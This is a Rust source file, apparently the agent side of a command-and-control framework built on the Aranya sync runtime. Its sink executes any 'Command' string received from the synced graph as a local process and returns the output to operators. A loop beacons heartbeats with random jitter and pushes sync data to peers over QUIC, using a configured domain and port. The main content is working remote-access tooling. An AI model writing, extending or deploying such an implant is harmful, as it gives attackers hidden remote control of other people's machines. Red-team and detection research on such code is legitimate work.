mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    net::{
        IpAddr,
        Ipv4Addr,
        SocketAddr,
    },
    rc::Rc,
    cell::RefCell,
    sync::Arc,
};
use aranya_policy_vm::{text, Text};
use aranya_runtime::{storage::GraphId, Sink, VmEffect, vm_action};
use aranya_crypto::BaseId;
use tokio::{time::{Duration, sleep}};
use crate::{c2syncer::{c2push, c2sync, new_quic_client, run_c2syncer}, policy::command_executed};
use tokio::sync::Mutex;
use chrono::prelude::*;
use rand::seq::IndexedRandom;

struct C2Sink {
    pub client: Option<Arc<Mutex<common::C2Client<C2Sink>>>>
}

impl Sink<VmEffect> for C2Sink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, effect: VmEffect) {
        if effect.name == "Command" {
            if let aranya_policy_vm::Value::String(s) = effect.fields[0].value() {
                print!("COMMAND:{}\n", s.trim());
                let out = std::process::Command::new(s.trim()).output().expect("Error exec command");
                let stdout = String::from_utf8(out.stdout).expect("Output string fail");

                let clientr = &self.client.as_ref();

                if let Some(client) = clientr.cloned() {
                    tokio::spawn(async move {
                        let a: Text = stdout.try_into().expect("String to Text fail");
                        client.lock().await.do_action(vm_action!(command_executed(effect.command, a))).await;
                    });
                }
            }
        }
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

fn main() {
    // Enable logging to terminal 
    tracing_subscriber::fmt().init();

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    let rt = tokio::runtime::Builder::new_multi_thread()
        .thread_stack_size(100 * 1024 * 1024)
        .enable_all()
        .build()
        .unwrap();

    let mut ips: Vec<std::net::IpAddr> =
        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();
    
    // let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT);

    // TODO: TEMPORARY
    let args: Vec<String> = std::env::args().collect();
    let bind = args[1].parse().expect("IPv4 address in wrong format i.e. 127.0.0.1:1234");
    // TODO: END TEMPORARY

    rt.block_on(async move {
        // Set up Aranya
        let mut aranya = common::C2Client::init(
            config::POLICY.to_string(),
            bind,
            C2Sink {
                client: None
            }
        ).unwrap();

        let mut syncbind = bind.clone();
        syncbind.set_port(4446);
        let quic = Arc::new(new_quic_client(syncbind));

        tokio::spawn(
            run_c2syncer(
                Arc::clone(&aranya.c2syncerm),
                Arc::clone(&quic),
                bind
            )
        );

        // Aranya Mutex I guess, maybe should be called Aranya Arc
        let aranyam = Arc::new(Mutex::new(aranya));
        
        // Setup the sink and print graph information
        {
            let aranyac = Arc::clone(&aranyam);
            let aranyal = &mut *aranyac.lock().await;

            Arc::clone(&aranyal.sink).lock().await.client
                = Some(Arc::clone(&aranyam));

            let graph = GraphId::decode(config::GRAPH).unwrap();
            aranyal.set_graph(graph);

            print!("Working on Graph ID `{}`\n", graph);
        }

        // Let the syncer start up (warm up the engines :) )
        sleep(Duration::from_millis(1000)).await;



        // TODO: Temp default sync ip for operator
        // {
        //     let aranyac = Arc::clone(&aranyam);
        //     let aranyal = &mut *aranyac.lock().await;
        //     let mut syncerl = aranyal.c2syncerm.lock().await;

        //     syncerl.connections.push(SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 2)), 4445));
        // }

        // Syncing logic loop
        loop {
            print!("{:?} | Loop start\n", bind);
            // Stall for a random amount of time
            sleep(Duration::from_millis(rand::random_range(1000..2000))).await;

            // Sync up with some nodes
            let aranyac = Arc::clone(&aranyam);
            let aranyal = &mut *aranyac.lock().await;

            let syncaddrs = {
                let syncerl = aranyal.c2syncerm.lock().await;
                syncerl.connections.to_vec()
            };

            println!("{:?}", syncaddrs);

            // let mut max = 5;
            
            // for chosen in syncaddrs {
                // // for i in 1..20 {
                    //     // if let Some(mut chosen) = syncaddrs.choose(&mut rand::rng()) {
            //         let mut syncaddr = chosen;
            //         syncaddr.set_port(config::PORT);
            //         c2push(
                //             syncaddr,
            //             &quic,
            //             Arc::clone(&aranyal.c2syncerm)
            //         ).await;
            //     // }
            // // }
            // }
            
            aranyal.do_action(vm_action!(heartbeat())).await;

            let syncaddrs = {
                let syncer = aranyal.c2syncerm.lock().await;
                syncer.connections.to_vec()
            };

            for addr in syncaddrs {
                c2push(
                    addr,
                    Arc::clone(&quic),
                    Arc::clone(&aranyal.c2syncerm)
                ).await;
            }

            print!("{:?} | Loop end\n", bind);
        }
    });
}
